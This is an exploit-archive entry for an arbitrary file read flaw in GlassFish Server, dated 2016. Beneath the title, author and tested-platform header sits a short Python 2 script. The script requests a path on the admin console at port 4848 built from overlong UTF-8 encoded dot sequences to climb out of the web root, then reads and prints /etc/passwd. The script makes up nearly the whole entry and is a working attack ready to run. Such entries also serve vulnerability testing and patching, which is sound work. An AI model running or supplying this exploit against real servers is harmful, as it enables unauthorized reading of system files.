# Title: glassfish Arbitrary file read vulnerability
# Date : 01/15/2016
# Author: bingbing
# Software link: https://glassfish.java.net/download.html
# Software: GlassFish Server
# Tested: Linux x86


#!/usr/bin/python
import urllib2
response=urllib2.urlopen('http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd')
s=response.read()
print s